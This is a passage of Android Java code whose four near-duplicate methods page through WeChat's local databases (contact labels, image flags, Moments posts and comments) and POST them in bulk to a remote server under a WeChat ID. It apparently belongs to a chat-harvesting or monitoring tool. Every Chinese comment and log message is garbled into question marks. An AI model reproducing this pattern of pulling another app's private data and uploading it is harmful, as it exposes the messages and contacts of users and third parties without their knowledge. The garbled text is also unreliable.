            public void onResponse(String response) {
                RLog.d(TAG, "uploadContactLabelToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    ContactLabel data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_CONTACT_LABEL,data.createTime);
                }
                countDownLatch.countDown();
                uploadContactLabelToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadContactLabelToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadContactLabelToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadContactLabelToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadContactLabelToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
    }

    public void uploadImgFlagToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {
        if (currentCount==totalCount){
            RLog.d(TAG, "uploadImgFlagToServer ?????????????????? ");
            return;
        }

        RLog.d(TAG, "uploadImgFlagToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;
        final List<ImgFlag> list = ImgFlagHelper.getImgFlagList(contactDb,updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadImgFlagToServer:"+list.size());
        JsonWrap<ImgFlag> jsonWrap =new JsonWrap();
        jsonWrap.setJsonInfo(list);
        jsonWrap.setType("6");
        jsonWrap.setVxid(wxId);
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "?????????????????????" + json + "???");

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadImgFlagToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    ImgFlag data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_IMG_FLAG,data.lastupdatetime);
                }
                countDownLatch.countDown();
                uploadImgFlagToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadImgFlagToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadImgFlagToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadImgFlagToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadImgFlagToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
    }

    public void uploadSnsinfoToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {

        if (currentCount==totalCount){
            RLog.d(TAG, "uploadSnsinfoToServer ?????????????????? ");
            return;
        }

        RLog.d(TAG, "uploadSnsinfoToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;

        final List<Snsinfo> list = SnsinfoHelper.getSnsInfoList(snsDb, updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadSnsinfoToServer:"+list.size());
        final String json = new Gson().toJson(list);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "?????????????????????" + json + "???");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadSnsinfoToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    Snsinfo data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_SNS_INFO,data.getCreateTime());
                }
                countDownLatch.countDown();
                uploadSnsinfoToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadSnsinfoToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadSnsinfoToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadSnsinfoToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadSnsinfoToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
    }


    public void uploadSnscommentToServer(String wxId,final int currentCount,final int totalCount,final int retryCount,final CountDownLatch countDownLatch,final String updateTime) {

        if (currentCount==totalCount){
            RLog.d(TAG, "uploadSnscommentToServer ?????????????????? ");
            return;
        }

        RLog.d(TAG, "uploadSnscommentToServer ???????????? "+currentCount+" = "+totalCount);
        float pageStart =currentCount*pageSize;

        final List<Snscomment> list = SnscommentHelper.getSnscommentList(snsDb, updateTime,(int)pageStart,(int)pageSize);
        RLog.d(TAG,"uploadSnscommentToServer:"+list.size());
        final String json = new Gson().toJson(list);
        String url = ConfigWechat.insertWeChatRecord;
//        RLog.d(TAG, "uploadSnscommentToServer ?????????????????????" + json + "???");


        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                RLog.d(TAG, "uploadSnscommentToServer ????????????????????????" + response + "???");
                //?????????????????????????????????
                if (list.size()>0){
                    Snscomment data = list.get(list.size()-1);
                    SqlDataUtil1.updateTableStamp(TABLE_SNS_COMMENT,data.getCreateTime());
                }
                countDownLatch.countDown();
                uploadSnscommentToServer(wxId,currentCount+1,totalCount,0,countDownLatch,updateTime);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError volleyError) {
                int alRetryCount =retryCount;
                if (alRetryCount<maxRetryCount){
                    RLog.d(TAG, "uploadSnscommentToServer ?????????????????? ??????" + volleyError.getMessage() + "??? ????????????????????????:"+retryCount+" ????????????????????????"+maxRetryCount);
                    uploadSnscommentToServer(wxId,currentCount,totalCount,retryCount+1,countDownLatch,updateTime);
                }else {
                    RLog.d(TAG, "uploadSnscommentToServer ?????????????????? ??????" + volleyError.getMessage() + "???");
                    releaseCountDownLatch(currentCount,totalCount,countDownLatch);
                }
                RLog.d(TAG, volleyError.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> map = new HashMap<>();
                map.put("wechatRecord", json);
                return map;
            }
        };
        stringRequest.setTag("uploadSnscommentToServer");
        stringRequest.setRetryPolicy(new DefaultRetryPolicy( 5*1000,//????????????????????????????????????????????????????????????????????????500000
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,//????????????????????????
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT ) );
        RequestQueueSingle.getInstance(UploadService.getContext()).addToRequestQueue(stringRequest);
//        Volley.newRequestQueue(UploadService.getContext()).add(stringRequest);
    }




}
